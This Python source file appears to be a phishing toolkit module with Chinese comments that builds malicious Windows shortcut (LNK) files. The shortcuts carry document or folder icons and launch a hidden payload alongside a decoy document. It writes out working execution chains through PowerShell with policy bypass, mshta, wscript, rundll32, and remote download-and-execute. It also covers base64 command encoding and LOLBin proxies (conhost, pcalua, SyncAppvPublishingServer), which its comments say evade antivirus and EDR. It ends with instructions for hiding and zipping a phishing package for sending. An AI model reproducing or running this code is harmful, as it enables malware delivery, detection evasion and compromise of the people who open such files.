import os
import subprocess
import tempfile
import random
import string
import base64
from config import OUTPUT_DIR


# ============================================================
# 图标配置 — 只使用 Windows 系统必定自带的图标文件
# ============================================================
ICON_CONFIG = {
    "PDF 文档": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "PDF图标 (imageres.dll)"},
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "通用文档图标 (shell32.dll)"},
        ]
    },
    "Word 文档": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "文档图标 (imageres.dll)"},
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "通用文档图标 (shell32.dll)"},
        ]
    },
    "Excel 文档": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 123, "label": "表格图标 (imageres.dll)"},
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "通用文档图标 (shell32.dll)"},
        ]
    },
    "文件夹": {
        "options": [
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 3, "label": "文件夹图标"},
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 3, "label": "文件夹图标2"},
        ]
    },
    "图片文件": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 67, "label": "图片图标"},
        ]
    },
}


# ============================================================
# LNK 文件生成 — 三级回退
# win32com → PowerShell → VBScript
# ============================================================

def create_lnk_file(output_path, target_path, arguments="", icon_path="",
                     icon_index=0, description="", working_dir="", window_style=7):
    """
    生成 LNK 快捷方式文件。
    按优先级尝试：win32com → PowerShell → VBScript
    返回: (success: bool, message: str)
    """
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    # 方式1：win32com
    try:
        return _create_lnk_win32com(
            output_path, target_path, arguments, icon_path,
            icon_index, description, working_dir, window_style
        )
    except Exception:
        pass

    # 方式2：PowerShell
    try:
        return _create_lnk_powershell(
            output_path, target_path, arguments, icon_path,
            icon_index, description, working_dir, window_style
        )
    except Exception:
        pass

    # 方式3：VBScript
    try:
        return _create_lnk_vbscript(
            output_path, target_path, arguments, icon_path,
            icon_index, description, working_dir, window_style
        )
    except Exception as e:
        return False, f"所有 LNK 生成方式均失败: {str(e)}"


def _create_lnk_win32com(output_path, target_path, arguments, icon_path,
                          icon_index, description, working_dir, window_style):
    import win32com.client
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(output_path)
    shortcut.TargetPath = target_path
    shortcut.Arguments = arguments
    shortcut.Description = description
    shortcut.WindowStyle = window_style
    if working_dir:
        shortcut.WorkingDirectory = working_dir
    if icon_path:
        shortcut.IconLocation = f"{icon_path},{icon_index}"
    shortcut.save()
    return True, f"LNK 文件已生成（win32com）: {output_path}"


def _create_lnk_powershell(output_path, target_path, arguments, icon_path,
                            icon_index, description, working_dir, window_style):
    def escape_ps(s):
        return s.replace("'", "''")

    ps_script = f'''
$ws = New-Object -ComObject WScript.Shell
$s = $ws.CreateShortcut('{escape_ps(output_path)}')
$s.TargetPath = '{escape_ps(target_path)}'
$s.Arguments = '{escape_ps(arguments)}'
$s.Description = '{escape_ps(description)}'
$s.WindowStyle = {window_style}
'''
    if working_dir:
        ps_script += f"$s.WorkingDirectory = '{escape_ps(working_dir)}'\n"
    if icon_path:
        ps_script += f"$s.IconLocation = '{escape_ps(icon_path)},{icon_index}'\n"
    ps_script += "$s.Save()\n"

    result = subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
        capture_output=True, text=True, timeout=15
    )
    if result.returncode != 0:
        raise Exception(f"PowerShell 错误: {result.stderr}")
    if os.path.exists(output_path):
        return True, f"LNK 文件已生成（PowerShell）: {output_path}"
    raise Exception("PowerShell 执行完成但文件未生成")


def _create_lnk_vbscript(output_path, target_path, arguments, icon_path,
                          icon_index, description, working_dir, window_style):
    def escape_vbs(s):
        return s.replace('"', '""')

    vbs_content = f'''
Set ws = WScript.CreateObject("WScript.Shell")
Set sc = ws.CreateShortcut("{escape_vbs(output_path)}")
sc.TargetPath = "{escape_vbs(target_path)}"
sc.Arguments = "{escape_vbs(arguments)}"
sc.Description = "{escape_vbs(description)}"
sc.WindowStyle = {window_style}
'''
    if working_dir:
        vbs_content += f'sc.WorkingDirectory = "{escape_vbs(working_dir)}"\n'
    if icon_path:
        vbs_content += f'sc.IconLocation = "{escape_vbs(icon_path)},{icon_index}"\n'
    vbs_content += "sc.Save\n"

    vbs_path = os.path.join(tempfile.gettempdir(), f"_lnk_gen_{os.getpid()}.vbs")
    try:
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        result = subprocess.run(
            ["cscript", "//Nologo", vbs_path],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode != 0:
            raise Exception(f"VBScript 错误: {result.stderr}")
        if os.path.exists(output_path):
            return True, f"LNK 文件已生成（VBScript）: {output_path}"
        raise Exception("VBScript 执行完成但文件未生成")
    finally:
        try:
            os.remove(vbs_path)
        except OSError:
            pass


# ============================================================
# 执行方式模板
# ============================================================

def _random_str(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def build_explorer_open(payload_relative_path, decoy_relative_path=""):
    """Explorer 打开 — 最自然，适用 EXE"""
    target = "C:\\Windows\\explorer.exe"
    arguments = payload_relative_path

    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = f'/c start "" "{payload_relative_path}" & start "" "{decoy_relative_path}"'

    return target, arguments


def build_direct_target(payload_relative_path, decoy_relative_path=""):
    """直接指向 Payload — 进程链最干净"""
    target = payload_relative_path
    arguments = ""
    return target, arguments


def build_powershell_relative(ps_script_relative_path, decoy_relative_path=""):
    """PowerShell 执行脚本 — 适用 .ps1"""
    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    arguments = f'-nop -w hidden -ep bypass -f "{ps_script_relative_path}"'
    if decoy_relative_path:
        arguments += f';Start-Process "{decoy_relative_path}"'
    return target, arguments


def build_mshta_relative(hta_relative_path, decoy_relative_path=""):
    """MSHTA 执行HTA — 适用 .hta"""
    target = "C:\\Windows\\System32\\mshta.exe"
    arguments = hta_relative_path
    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = f'/c start "" mshta.exe "{hta_relative_path}" & start "" "{decoy_relative_path}"'
    return target, arguments


def build_wscript_relative(vbs_relative_path, decoy_relative_path=""):
    """WScript 执行VBS — 适用 .vbs/.js"""
    target = "C:\\Windows\\System32\\wscript.exe"
    arguments = vbs_relative_path
    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = f'/c start "" wscript.exe "{vbs_relative_path}" & start "" "{decoy_relative_path}"'
    return target, arguments


def build_rundll32_dll(dll_relative_path, export_function="DllMain", decoy_relative_path=""):
    """Rundll32 加载DLL — 仅适用 .dll"""
    target = "C:\\Windows\\System32\\rundll32.exe"
    arguments = f'"{dll_relative_path}",{export_function}'
    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = (
            f'/c start "" rundll32.exe "{dll_relative_path}",{export_function} '
            f'& start "" "{decoy_relative_path}"'
        )
    return target, arguments


def build_powershell_download_exec(download_url, download_filename="update.exe", decoy_relative_path=""):
    """PowerShell 远程下载"""
    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    temp_file = f'$env:TEMP\\{download_filename}'
    arguments = (
        f'-nop -w hidden -ep bypass -c '
        f'"(New-Object Net.WebClient).DownloadFile(\'{download_url}\',\'{temp_file}\');'
        f'Start-Process \'{temp_file}\'"'
    )
    if decoy_relative_path:
        arguments = arguments.rstrip('"') + f';Start-Process \\"{decoy_relative_path}\\""'
    return target, arguments


def build_powershell_base64_cmd(command, decoy_relative_path=""):
    """PowerShell Base64 命令"""
    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    full_command = command
    if decoy_relative_path:
        full_command += f';Start-Process "{decoy_relative_path}"'
    encoded = base64.b64encode(full_command.encode('utf-16-le')).decode()
    arguments = f'-nop -w hidden -ep bypass -EncodedCommand {encoded}'
    return target, arguments


def build_conhost_exec(payload_relative_path, decoy_relative_path=""):
    """Conhost 代理执行 — 替代 cmd.exe，监控较松"""
    target = "C:\\Windows\\System32\\conhost.exe"
    if decoy_relative_path:
        arguments = f'cmd.exe /c start "" "{payload_relative_path}" & start "" "{decoy_relative_path}"'
    else:
        arguments = f'cmd.exe /c start "" "{payload_relative_path}"'
    return target, arguments


def build_pcalua_exec(payload_relative_path, decoy_relative_path=""):
    """Pcalua 代理执行 — 微软签名 LOLBin，不经过 cmd"""
    target = "C:\\Windows\\System32\\pcalua.exe"
    arguments = f'-a "{payload_relative_path}"'
    # pcalua 不支持同时打开第二个文件
    return target, arguments


def build_syncappv_exec(powershell_command, decoy_relative_path=""):
    """SyncAppvPublishingServer 执行 — 利用 App-V 执行 PS"""
    target = "C:\\Windows\\System32\\SyncAppvPublishingServer.exe"
    full_cmd = powershell_command
    if decoy_relative_path:
        full_cmd += f';Start-Process "{decoy_relative_path}"'
    arguments = f'"n; {full_cmd}"'
    return target, arguments


# ============================================================
# 主生成函数
# ============================================================

def generate_lnk(
    execution_mode,
    command_or_url,
    icon_type,
    output_filename,
    payload_relative_path="",
    decoy_relative_path="",
    description="",
    dll_export_function="DllMain",
    download_filename="update.exe",
):
    """
    生成 LNK 快捷方式文件。
    返回: (success: bool, message: str)
    """
    try:
        # 1. 构建 target + arguments
        if execution_mode == "Explorer 打开":
            target, arguments = build_explorer_open(payload_relative_path, decoy_relative_path)

        elif execution_mode == "直接指向 Payload":
            target, arguments = build_direct_target(payload_relative_path, decoy_relative_path)

        elif execution_mode == "PowerShell 执行脚本":
            target, arguments = build_powershell_relative(payload_relative_path, decoy_relative_path)

        elif execution_mode == "MSHTA 执行HTA":
            target, arguments = build_mshta_relative(payload_relative_path, decoy_relative_path)

        elif execution_mode == "WScript 执行VBS":
            target, arguments = build_wscript_relative(payload_relative_path, decoy_relative_path)

        elif execution_mode == "Rundll32 加载DLL":
            target, arguments = build_rundll32_dll(
                payload_relative_path, dll_export_function, decoy_relative_path
            )

        elif execution_mode == "PowerShell 远程下载":
            target, arguments = build_powershell_download_exec(
                command_or_url, download_filename, decoy_relative_path
            )

        elif execution_mode == "PowerShell Base64 命令":
            target, arguments = build_powershell_base64_cmd(command_or_url, decoy_relative_path)

        elif execution_mode == "Conhost 代理执行":
            target, arguments = build_conhost_exec(payload_relative_path, decoy_relative_path)

        elif execution_mode == "Pcalua 代理执行":
            target, arguments = build_pcalua_exec(payload_relative_path, decoy_relative_path)

        elif execution_mode == "SyncAppvPublishingServer 执行":
            target, arguments = build_syncappv_exec(command_or_url, decoy_relative_path)

        else:
            return False, f"未知的执行方式: {execution_mode}"

        # 2. 图标
        icon_path = ""
        icon_index = 0
        if icon_type in ICON_CONFIG:
            first_opt = ICON_CONFIG[icon_type]["options"][0]
            icon_path = first_opt["path"]
            icon_index = first_opt["index"]

        # 3. 生成 LNK 文件
        if not output_filename.endswith(".lnk"):
            output_filename += ".lnk"

        output_path = os.path.join(OUTPUT_DIR, output_filename)

        success, gen_message = create_lnk_file(
            output_path=output_path,
            target_path=target,
            arguments=arguments,
            icon_path=icon_path,
            icon_index=icon_index,
            description=description or "Document",
            working_dir="",
            window_style=7,
        )

        if not success:
            return False, gen_message

        # 4. 钓鱼目录结构指引
        is_local = not is_remote_mode(execution_mode)

        guide_lines = [f"LNK 文件已生成: {os.path.abspath(output_path)}\n"]

        if is_local:
            folder_name = output_filename.replace('.lnk', '')
            if '.' in folder_name:
                folder_name = folder_name.rsplit('.', 1)[0]

            guide_lines.append("请按以下目录结构组织钓鱼文件包：")
            guide_lines.append("")
            guide_lines.append(f"  {folder_name}/")
            guide_lines.append(f"  ├── {output_filename}  ← LNK（用户看到并双击）")
            guide_lines.append(f"  └── data/  ← 隐藏目录")

            if payload_relative_path:
                payload_name = payload_relative_path.replace('\\', '/').split('/')[-1]
                guide_lines.append(f"      ├── {payload_name}  ← 你的payload")

            if decoy_relative_path:
                decoy_name = decoy_relative_path.replace('\\', '/').split('/')[-1]
                guide_lines.append(f"      └── {decoy_name}  ← 诱饵文档")

            guide_lines.append("")
            guide_lines.append("隐藏目录: attrib +h +s data")
            guide_lines.append(f"打包发送: 将 {folder_name}/ 整个目录压缩为 ZIP/RAR")

        return True, '\n'.join(guide_lines)

    except Exception as e:
        return False, f"生成 LNK 失败: {str(e)}"


# ============================================================
# 辅助查询函数
# ============================================================

def get_execution_modes():
    """返回执行方式列表（含分组分隔线）"""
    return [
        "--- 直接执行（适用 EXE） ---",
        "Explorer 打开",
        "直接指向 Payload",
        "--- 脚本执行 ---",
        "PowerShell 执行脚本",
        "MSHTA 执行HTA",
        "WScript 执行VBS",
        "Rundll32 加载DLL",
        "--- 远程下载执行 ---",
        "PowerShell 远程下载",
        "PowerShell Base64 命令",
        "--- 高级规避（不经过cmd） ---",
        "Conhost 代理执行",
        "Pcalua 代理执行",
        "SyncAppvPublishingServer 执行",
    ]


def get_icon_types():
    return list(ICON_CONFIG.keys())


def get_mode_description(mode):
    descriptions = {
        "Explorer 打开":
            "使用 explorer.exe 打开 payload。最自然的执行方式，适用于 EXE 文件。\n"
            "Payload路径填写相对路径，如：data\\payload.exe\n"
            "✅ 单文件模式不经过 cmd.exe",
        "直接指向 Payload":
            "LNK 直接指向 payload 文件路径，Windows 根据文件类型自动执行。\n"
            "进程链最干净，但 LNK 属性中可看到目标路径。\n"
            "Payload路径填写相对路径，如：data\\payload.exe",
        "PowerShell 执行脚本":
            "使用 PowerShell 执行隐藏目录中的 .ps1 脚本。\n"
            "Payload路径填写脚本路径，如：data\\script.ps1",
        "MSHTA 执行HTA":
            "使用 mshta.exe 执行隐藏目录中的 .hta 文件。\n"
            "Payload路径填写 HTA 路径，如：data\\payload.hta",
        "WScript 执行VBS":
            "使用 wscript.exe 执行隐藏目录中的 .vbs 脚本。\n"
            "Payload路径填写 VBS 路径，如：data\\script.vbs",
        "Rundll32 加载DLL":
            "使用 rundll32.exe 加载 DLL 文件（APT28/Fancy Bear 常用）。\n"
            "⚠️ 仅适用于 DLL 文件，不能用于 EXE！\n"
            "DLL 必须导出指定的函数（默认 DllMain）。\n"
            "Payload路径填写 DLL 相对路径，如：data\\payload.dll",
        "PowerShell 远程下载":
            "使用 PowerShell 从远程 URL 下载并执行（不需要本地 payload 文件）。\n"
            "命令/URL 填写远程文件地址。",
        "PowerShell Base64 命令":
            "将 PowerShell 命令 Base64 编码后执行，绕过命令行关键词检测。\n"
            "命令/URL 填写 PowerShell 命令。",
        "Conhost 代理执行":
            "使用 conhost.exe 代替 cmd.exe 执行命令。\n"
            "conhost 是控制台宿主进程，部分杀软/EDR 对其监控较松。\n"
            "✅ 可规避部分针对 cmd.exe 的检测规则\n"
            "适用于 EXE 文件。",
        "Pcalua 代理执行":
            "使用 pcalua.exe（程序兼容性助手）代理执行。\n"
            "微软签名的 LOLBin，可启动任意 EXE。\n"
            "✅ 不经过 cmd.exe，进程链：pcalua.exe → payload.exe\n"
            "适用于 EXE 文件。",
        "SyncAppvPublishingServer 执行":
            "利用 App-V 组件 SyncAppvPublishingServer.exe 执行 PowerShell 命令。\n"
            "微软签名程序，很多 EDR 不监控此进程。\n"
            "✅ 不直接调用 powershell.exe\n"
            "命令/URL 填写 PowerShell 命令。",
    }
    return descriptions.get(mode, "")


def is_remote_mode(mode):
    """判断是否为远程/命令模式（不需要本地payload路径）"""
    return mode in [
        "PowerShell 远程下载",
        "PowerShell Base64 命令",
        "SyncAppvPublishingServer 执行",
    ]


def is_separator(mode):
    """判断是否为分隔线"""
    return mode.startswith("---")
